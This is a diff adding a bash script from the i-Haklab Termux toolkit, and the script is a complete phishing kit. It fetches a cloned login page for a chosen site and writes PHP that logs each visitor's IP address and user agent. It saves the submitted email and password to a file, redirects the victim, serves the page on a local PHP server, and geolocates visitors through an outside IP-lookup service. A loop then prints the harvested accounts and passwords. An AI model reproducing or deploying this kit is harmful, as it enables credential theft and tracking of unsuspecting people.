@@ -1,0 +1,198 @@
+#!/data/data/com.termux/files/usr/bin/env bash
+#This file is part of i-Haklab command
+
+if [ -d /data/data/com.termux/files/usr/share/tools/i-Haklab ]; then
+	iHAKLAB=/data/data/com.termux/files/usr/share/tools/i-Haklab
+else
+	iHAKLAB=/data/data/com.termux/files/home/storage/external-1/tools/i-Haklab
+fi
+
+source $iHAKLAB/.set/var/variables
+source $iHAKLAB/.set/var/variables
+source $iHAKLAB/.set/functions/functions
+
+SITE=$1
+REDIRECT=$2
+
+TMP_PATH=$PREFIX/var/service/php/$SITE
+if [ ! -d $TMP_PATH ]; then
+        mkdir -p $TMP_PATH
+fi
+
+Doindex() {
+        echo "<?php" > $TMP_PATH/index.php
+        echo "include 'ip.php';" >> $TMP_PATH/index.php
+        echo "header('Location: login.html');" >> $TMP_PATH/index.php
+        echo "exit" >> $TMP_PATH/index.php
+        echo '?>' >> $TMP_PATH/index.php
+}
+
+Clone() {
+        printf "$G\n[+]->$W Site $SITE cloned"
+wget -q https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/phishing/$SITE -O $TMP_PATH/login.html
+}
+
+Doip-php() {
+        echo "<?php" > $TMP_PATH/ip.php
+        echo " " >> $TMP_PATH/ip.php
+        echo "if (!empty(\$_SERVER['HTTP_CLIENT_IP']))" >> $TMP_PATH/ip.php
+        echo "    {" >> $TMP_PATH/ip.php
+        echo "      \$ipaddress = \$_SERVER['HTTP_CLIENT_IP'].\"\r\n\";" >> $TMP_PATH/ip.php
+        echo "    }" >> $TMP_PATH/ip.php
+        echo "elseif (!empty(\$_SERVER['HTTP_X_FORWARDED_FOR']))" >> $TMP_PATH/ip.php
+        echo "    {" >> $TMP_PATH/ip.php
+        echo "      \$ipaddress = \$_SERVER['HTTP_X_FORWARDED_FOR'].\"\r\n\";" >> $TMP_PATH/ip.php
+        echo "    }" >> $TMP_PATH/ip.php
+        echo "else" >> $TMP_PATH/ip.php
+        echo "    {" >> $TMP_PATH/ip.php
+        echo "      \$ipaddress = \$_SERVER['REMOTE_ADDR'].\"\r\n\";" >> $TMP_PATH/ip.php
+        echo "    }" >> $TMP_PATH/ip.php
+        echo "\$useragent = \" User-Agent: \";" >> $TMP_PATH/ip.php
+        echo "\$browser = \$_SERVER['HTTP_USER_AGENT'];" >> $TMP_PATH/ip.php
+        echo " " >> $TMP_PATH/ip.php
+        echo " " >> $TMP_PATH/ip.php
+        echo "\$file = 'ip.txt';" >> $TMP_PATH/ip.php
+        echo "\$victim = \"IP: \";" >> $TMP_PATH/ip.php
+        echo "\$fp = fopen(\$file, 'a');" >> $TMP_PATH/ip.php
+        echo " " >> $TMP_PATH/ip.php
+        echo "fwrite(\$fp, \$victim);" >> $TMP_PATH/ip.php
+        echo "fwrite(\$fp, \$ipaddress);" >> $TMP_PATH/ip.php
+        echo "fwrite(\$fp, \$useragent);" >> $TMP_PATH/ip.php
+        echo "fwrite(\$fp, \$browser);" >> $TMP_PATH/ip.php
+        echo " " >> $TMP_PATH/ip.php
+        echo " " >> $TMP_PATH/ip.php
+        echo "fclose(\$fp);" >> $TMP_PATH/ip.php
+}
+
+Doredirect() {
+        echo "<?php" > $TMP_PATH/post.php
+        echo "header('Location: https://$REDIRECT');" >> $TMP_PATH/post.php
+        echo "if (!empty(\$_POST['email'])) {file_put_contents(\"usernames.txt\", \"Account: \" . \$_POST['email'] . \" Pass: \" . \$_POST['pass'] . \"\n\", FILE_APPEND);" >> $TMP_PATH/post.php
+        echo "}" >> $TMP_PATH/post.php
+        echo "" >> $TMP_PATH/post.php
+        echo "exit();" >> $TMP_PATH/post.php
+}
+
+Server() {
+	checkphp=$(ps aux | grep -o "php" | head -n1)
+#	checkphp=$(ps aux | grep "127.0.0.1:4546" | head -n1 | awk '{print $2}')
+	if [ $checkphp == *'php'* ]; then
+#	if [ ! -z $checkphp ]; then
+#		kill -TERM $checkphp > /dev/null 2>&1
+		pkill -f -2 php > /dev/null 2>&1
+		killall -2 php > /dev/null 2>&1
+        fi
+        ########## RUNNING SERVER #################
+        exec serverphp 4546 IO $TMP_PATH > /dev/null 2>&1 &
+        ###########################################
+}
+
+IPs() {
+        IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
+        IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)
+        if [ ! -z $IP ]; then
+                printf "$G[+]-> IP:$W\t$IP"
+                sleep 0.5
+        fi
+        UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2 | head -n1 | awk '{print $1 $2 $3 $4 $5 $6}')
+        if [ ! -z $UA ]; then
+                printf "$G[+]-> USER AGENT:$W\t$UA"
+                sleep 0.5
+        fi
+        IP_SPEED=$(grep -o "IP Address Speed:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+        if [ ! -z $IP_SPEED ]; then
+                echo $IP_SPEED >> $TMP_PATH/creds.txt
+                printf "$G[+]-> IP SPEED:$W\t$IP_SPEED"
+                sleep 0.5
+        fi
+        IP_CURRENCY=$(grep -o "IP Currency:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+        if [ ! -z $IP_CURRENCY ]; then
+                echo $IP_CURRENCY >> $TMP_PATH/creds.txt
+                printf "$G[+]-> IP CURRENCY:$W\t$IP_CURRENCY"
+                sleep 0.5
+        fi
+        CONTINENT=$(grep -o 'Continent.*' $TMP_PATH/iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
+        if [ ! -z $CONTINENT ]; then
+                echo $CONTINENT >> $TMP_PATH/creds.txt
+                printf "$G[+]-> CONTINENT:$W\t$CONTINENT"
+                sleep 0.5
+        fi
+        COUNTRY=$(grep -o 'Country:.*' $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
+        if [ ! -z $COUNTRY ]; then
+                echo $COUNTRY >> $TMP_PATH/creds.txt
+                printf "$G[+]-> COUNTRY:$W\t$COUNTRY"
+                sleep 0.5
+        fi
+        STATE=$(grep -o "tracking lessimpt.*" $TMP_PATH/iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
+        if [ ! -z $STATE ]; then
+                echo $STATE >> $TMP_PATH/creds.txt
+                printf "$G[+]-> STATE:$W\t$STATE"
+                sleep 0.5
+        fi
+        CITY=$(grep -o "City Location:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+        if [ ! -z $CITY ]; then
+                echo $CITY >> $TMP_PATH/creds.txt
+                printf "$G[+]-> CITY:$W\t$CITY"
+                sleep 0.5
+        fi
+
+ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+        if [ ! -z $ISP ]; then
+                echo $ISP >> $TMP_PATH/creds.txt
+                printf "$G[+]-> ISP:$W\t$ISP"
+                sleep 0.5
+        fi
+        AS_NUMBER=$(grep -o "AS Number:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+        if [ ! -z $AS_NUMBER ]; then
+                echo $AS_NUMBER >> $TMP_PATH/creds.txt
+                printf "$G[+]-> AS NUMBER:$W\t$AS_NUMBER"
+                sleep 0.5
+        fi
+}
+
+Creds() {
+        ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
+        if [ ! -z $ACCOUNT ]; then
+                printf "$G[+]-> ACCOUNT:$W\t$ACCOUNT"
+                sleep 0.5
+        fi
+        PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d ":" -f2)
+        if [ ! -z $PASSWD ]; then
+                printf "$G[+]-> PASSWORD:$W\t$PASSWD"
+                sleep 0.5
+        fi
+}
+
+#MAIN
+Doindex
+Doip-php
+Doredirect
+Clone
+Server
+
+for FILE in ip.txt usernames.txt iptracker.log ; do
+	if [ -e $TMP_PATH/$FILE ]; then
+		rm $TMP_PATH/$FILE > /dev/null 2>&1
+        fi
+done
+
+if [ ! -e $TMP_PATH/creds.txt ]; then
+        touch $TMP_PATH/creds.txt
+fi
+
+date >> $TMP_PATH/creds.txt
+printf "$Y\n[!]->$W Server php running on http://127.0.0.1:4546$Y\n[!]->$W To lunch it out of lan run :$G i-Haklab forwarding$Y\n[!]->$W Credentials will be save in \$PREFIX/var/service/php/$SITE/creds.txt$B\n[-]->$W Waiting for information (ctrl_c to cancel). . .\n"
+while [ true ]; do
+	sleep 10
+        
+	while [ -e $TMP_PATH/ip.txt ]; do
+		phishing-IPresults
+		rm $TMP_PATH/ip.txt
+        done
+
+	while [ -e $TMP_PATH/usernames.txt ]; do
+		phishing-CredsResults
+		rm $TMP_PATH/usernames.txt
+	done
+done
+#		@IVAM3
